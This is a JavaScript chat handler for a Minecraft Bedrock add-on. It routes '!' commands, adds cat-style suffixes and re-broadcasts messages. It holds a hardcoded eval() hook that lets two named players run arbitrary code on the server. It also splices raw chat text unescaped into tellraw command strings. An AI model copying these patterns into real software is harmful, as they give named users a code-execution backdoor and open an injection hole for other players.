import { world, system, Entity, Player, ItemStack } from '@minecraft/server';
import { checkperms, generateVoxelSphere, logger, tellPlayer, calcCornersDist, copyRegion, pasteRegion} from './helpers.js';
import { ModalFormData, MessageFormData, ActionFormData } from '@minecraft/server-ui';
import { commandManager } from "./commandManager.js"
import "./commands/index.js"
// Event Listener for Chat Commands
const before = world.beforeEvents;
before.chatSend.subscribe((data) => {
  data.cancel = true; 
  const pname = data.sender.name, player = data.sender, m = data.message, playerName = player.getTags().filter(tag => tag.startsWith("Neko:nametag_"))[0] ? player.getTags().filter(tag => tag.startsWith("Neko:nametag_"))[0].replace("Neko:nametag_", "") : player.name;
  system.run(() => { 
if ((pname === "XXavier876" || pname === "Neko19232") && m.startsWith(">>>")) {
  const modal = new ModalFormData()
  
    .title("Eval")
    .textField("Code", "§N§e§k§o§rcode")
    system.runTimeout(()=>{
    modal.show(player)
    .then((results) => {
      const codeToEval = results.formValues[0]; // Get the code inputted by the player

      if (!codeToEval || codeToEval.trim() === "") {
        // Handle the case where no code was input
        if (pname === "Neko19232") {
          tellPlayer("Uhmm so you, or actually I forgot to write some code", player);
        } else if (pname === "XXavier876") {
          tellPlayer("Hey, XX, you can't just ask to write code and not write anything", player);
        }
        return; // Exit the function if no code was entered
      }

      // Function to evaluate code and send live logs to player
      const evalWithLogs = (code) => {
        const log = (msg) => {
          tellPlayer(msg, player); // Send log messages to player
        };

        // Override console.log to send logs to the player
        const originalConsoleLog = console.log;
        console.log = (...args) => {
          args.forEach(arg => log(String(arg)));
          originalConsoleLog(...args);
        };

        try {
          // Dynamic import of modules and running the code with `player` available
          eval(`
            (async function(player) {
              const { world, system, Entity, Player, ItemStack } = await import('@minecraft/server');
              const { ModalFormData } = await import('@minecraft/server-ui');
              // Evaluate the provided code in this context
              ${code}
            })(player);
          `);
        } catch (e) {
          log(`Error: ${e.message}`);
        } finally {
          // Restore the original console.log after evaluation
          console.log = originalConsoleLog;
        }
      };

      evalWithLogs(codeToEval); // Run the eval function
      logger.info(`[commandManager] ${pname} ran eval with code from modal`);
    }).catch((e) => {
      tellPlayer("An error occurred while opening the eval modal.", player);
      logger.error(`[commandManager] ${pname} failed to open eval modal`);
    });
},40)
}
    if (m.startsWith("!")) { 
      commandManager.executeCommand(m.slice(1),player)
    } else if (player.hasTag("Neko:nya~")) { 
      let message = `${m}`; 
      let suffixOptions = [" Nya~", " Meow~", " Mew~", "", "", ""];
      let randomSuffix = suffixOptions[Math.floor(Math.random() * suffixOptions.length)]; 
      player.runCommand(`tellraw @a { "rawtext": [ { "text": "<${playerName}> ${message}${randomSuffix}"}]}`); 
      logger.info(`[chat] <${pname}> ${message}${randomSuffix}`);
    } else { 
      player.runCommand(`tellraw @a { "rawtext": [ { "text": "<${playerName}> ${m}"}]}`); 
      logger.info(`[chat] <${pname}> ${m}`);
    }
  }); 
});